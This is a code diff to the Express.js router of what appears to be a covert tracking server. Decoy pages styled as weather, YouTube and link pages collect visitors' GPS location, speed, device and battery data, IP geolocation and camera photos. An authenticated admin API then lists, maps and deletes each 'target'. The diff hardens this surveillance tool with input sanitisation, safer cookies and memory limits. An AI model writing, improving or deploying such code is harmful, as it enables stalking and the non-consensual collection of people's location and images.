@@ -2,7 +2,19 @@ const express = require("express")
 const router = express.Router()
 const config = require("./config")
 
-const TARGETS = {}
+const TARGETS = new Map()
+
+function sanitizeTargetId(id) {
+    if (typeof id !== 'string') return null;
+    const clean = id.trim();
+    if (['__proto__', 'constructor', 'prototype'].includes(clean.toLowerCase())) {
+        return null;
+    }
+    if (/^[a-zA-Z0-9_-]{4,64}$/.test(clean)) {
+        return clean;
+    }
+    return null;
+}
 
 function extractClientIp(req) {
     const cfIp = req.headers['cf-connecting-ip'];
@@ -66,17 +78,20 @@ async function getIpInfo(ip) {
     };
 }
 
-function updateTargetTelemetry(id, payload) {
+function updateTargetTelemetry(rawId, payload) {
+    const id = sanitizeTargetId(rawId);
     if (!id) return null;
 
-    if (!TARGETS[id]) {
-        TARGETS[id] = {
+    let target = TARGETS.get(id);
+
+    if (!target) {
+        target = {
             id: id,
-            lat: payload.lat || 0,
-            lng: payload.lng || 0,
-            accuracy: payload.accuracy || 0,
-            speed: payload.speed || 0,
-            heading: payload.heading || 0,
+            lat: (typeof payload.lat === 'number' && !isNaN(payload.lat)) ? payload.lat : 0,
+            lng: (typeof payload.lng === 'number' && !isNaN(payload.lng)) ? payload.lng : 0,
+            accuracy: (typeof payload.accuracy === 'number' && !isNaN(payload.accuracy)) ? payload.accuracy : 0,
+            speed: (typeof payload.speed === 'number' && !isNaN(payload.speed)) ? payload.speed : 0,
+            heading: (typeof payload.heading === 'number' && !isNaN(payload.heading)) ? payload.heading : 0,
             battery: payload.battery || null,
             device: payload.device || null,
             ipLocation: payload.ipLocation || null,
@@ -84,131 +99,161 @@ function updateTargetTelemetry(id, payload) {
             lastSeen: Date.now(),
             template: payload.template || 'weather'
         };
+        TARGETS.set(id, target);
         if (global.IO) {
             global.IO.emit("user-connected", id);
         }
     } else {
-        if (payload.lat !== undefined && payload.lat !== null) TARGETS[id].lat = payload.lat;
-        if (payload.lng !== undefined && payload.lng !== null) TARGETS[id].lng = payload.lng;
-        if (payload.accuracy !== undefined) TARGETS[id].accuracy = payload.accuracy;
-        if (payload.speed !== undefined) TARGETS[id].speed = payload.speed;
-        if (payload.heading !== undefined) TARGETS[id].heading = payload.heading;
-        if (payload.battery) TARGETS[id].battery = payload.battery;
-        if (payload.device) TARGETS[id].device = payload.device;
-        if (payload.ipLocation) TARGETS[id].ipLocation = payload.ipLocation;
-        if (payload.template) TARGETS[id].template = payload.template;
-        TARGETS[id].lastSeen = Date.now();
+        if (typeof payload.lat === 'number' && !isNaN(payload.lat)) target.lat = payload.lat;
+        if (typeof payload.lng === 'number' && !isNaN(payload.lng)) target.lng = payload.lng;
+        if (typeof payload.accuracy === 'number' && !isNaN(payload.accuracy)) target.accuracy = payload.accuracy;
+        if (typeof payload.speed === 'number' && !isNaN(payload.speed)) target.speed = payload.speed;
+        if (typeof payload.heading === 'number' && !isNaN(payload.heading)) target.heading = payload.heading;
+        if (payload.battery) target.battery = payload.battery;
+        if (payload.device) target.device = payload.device;
+        if (payload.ipLocation) target.ipLocation = payload.ipLocation;
+        if (payload.template) target.template = payload.template;
+        target.lastSeen = Date.now();
     }
 
-    if (payload.photo) {
-        if (!TARGETS[id].photos) TARGETS[id].photos = [];
-        // Prevent duplicate photo entries
-        if (TARGETS[id].photos.length === 0 || TARGETS[id].photos[0].data !== payload.photo) {
-            TARGETS[id].photos.unshift({
+    if (payload.photo && typeof payload.photo === 'string' && payload.photo.startsWith('data:image/')) {
+        if (!target.photos) target.photos = [];
+        if (target.photos.length === 0 || target.photos[0].data !== payload.photo) {
+            target.photos.unshift({
                 id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
                 data: payload.photo,
                 timestamp: Date.now()
             });
-            // Keep maximum 30 high-res photos per target
-            if (TARGETS[id].photos.length > 30) {
-                TARGETS[id].photos.pop();
+            // Keep maximum 10 photos per target to stay well within memory & Vercel limits
+            if (target.photos.length > 10) {
+                target.photos.pop();
             }
         }
     }
 
     if (global.IO) {
-        global.IO.emit("map-data", { id: id, target: TARGETS[id], lat: TARGETS[id].lat, lng: TARGETS[id].lng });
+        global.IO.emit("map-data", { id: id, target: target, lat: target.lat, lng: target.lng });
     }
 
-    return TARGETS[id];
+    return target;
 }
 
 // Login route
-router.route("/login").get((req, res) => {
-    res.render("login")
-}).post((req, res) => {
-    const { username, password } = req.body
+router.route("/login")
+    .get((req, res) => {
+        res.render("login");
+    })
+    .post((req, res) => {
+        const { username, password } = req.body;
 
-    if (config.username === username && config.password === password) {
-        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
-    }
+        if (config.username === username && config.password === password) {
+            res.cookie("token", config.token, { httpOnly: true, maxAge: 86400000 });
+            return res.redirect("/");
+        } else {
+            return res.redirect("/login?error=invalid");
+        }
+    });
 
-    res.redirect("/")
-})
+router.get("/logout", (req, res) => {
+    res.clearCookie("token").redirect("/login");
+});
 
 // Decoy & Telemetry ingestion routes
 router.route("/weather").get((req, res) => {
-    res.render("weather")
+    res.render("weather");
 }).post(async (req, res) => {
     const clientIp = extractClientIp(req);
     if (!req.body.ipLocation) {
         req.body.ipLocation = await getIpInfo(clientIp);
     }
-    updateTargetTelemetry(req.body.id, req.body)
-    res.send("OK")
-})
+    updateTargetTelemetry(req.body.id, req.body);
+    res.send("OK");
+});
 
 router.route("/youtube").get((req, res) => {
-    res.render("youtube")
-})
+    res.render("youtube");
+});
 
 router.route("/custom").get((req, res) => {
-    res.render("custom")
-})
+    res.render("custom");
+});
 
 router.route("/link").get((req, res) => {
-    res.render("link")
-})
+    res.render("link");
+});
 
 router.route("/api/telemetry").post(async (req, res) => {
     const clientIp = extractClientIp(req);
     if (!req.body.ipLocation || !req.body.ipLocation.ip) {
         req.body.ipLocation = await getIpInfo(clientIp);
     }
-    const target = updateTargetTelemetry(req.body.id, req.body)
-    res.json({ status: "OK", target })
-})
+    const target = updateTargetTelemetry(req.body.id, req.body);
+    if (!target) {
+        return res.status(400).json({ status: "ERROR", message: "Invalid payload or Target ID" });
+    }
+    res.json({ status: "OK", id: target.id });
+});
 
-// Token verification middleware
+// Token verification middleware for Admin routes & APIs
 router.use(function checkToken(req, res, next) {
-    const token = req.cookies.token
+    const token = req.cookies.token;
 
     if (token != null && token === config.token) {
-        next()
+        next();
     } else {
-        res.clearCookie("token").redirect("/login")
+        res.clearCookie("token").redirect("/login");
     }
-})
+});
 
 // Target Management APIs
 router.get("/api/targets", (req, res) => {
-    res.json(TARGETS)
-})
+    const summary = {};
+    for (const [id, target] of TARGETS.entries()) {
+        // Omit heavy photo base64 data string in targets list overview to reduce network payload
+        summary[id] = {
+            id: target.id,
+            lat: target.lat,
+            lng: target.lng,
+            accuracy: target.accuracy,
+            speed: target.speed,
+            heading: target.heading,
+            battery: target.battery,
+            device: target.device,
+            ipLocation: target.ipLocation,
+            photosCount: target.photos ? target.photos.length : 0,
+            photos: (target.photos || []).map(p => ({ id: p.id, timestamp: p.timestamp })),
+            lastSeen: target.lastSeen,
+            template: target.template
+        };
+    }
+    res.json(summary);
+});
 
 router.get("/api/targets/:id", (req, res) => {
-    res.json(TARGETS[req.params.id] || null)
-})
+    const cleanId = sanitizeTargetId(req.params.id);
+    if (!cleanId) return res.status(404).json(null);
+    res.json(TARGETS.get(cleanId) || null);
+});
 
 router.delete("/api/targets/:id", (req, res) => {
-    if (TARGETS[req.params.id]) {
-        delete TARGETS[req.params.id]
-        if (global.IO) global.IO.emit("user-disconnected", req.params.id)
+    const cleanId = sanitizeTargetId(req.params.id);
+    if (cleanId && TARGETS.has(cleanId)) {
+        TARGETS.delete(cleanId);
+        if (global.IO) global.IO.emit("user-disconnected", cleanId);
     }
-    res.json({ success: true })
-})
+    res.json({ success: true });
+});
 
 router.route("/").get((req, res) => {
-    res.render("home", {
-        TARGETS
-    })
-})
+    res.render("home");
+});
 
 router.route("/map").get((req, res) => {
-    const { id } = req.query
-    const target = TARGETS[id]
+    const cleanId = sanitizeTargetId(req.query.id);
+    const target = cleanId ? TARGETS.get(cleanId) : null;
     res.render("map", {
-        data: JSON.stringify(target ? [target.lat, target.lng] : [0, 0])
-    })
-})
+        data: JSON.stringify(target && typeof target.lat === 'number' ? [target.lat, target.lng] : [0, 0])
+    });
+});
 
-module.exports = router
+module.exports = router;
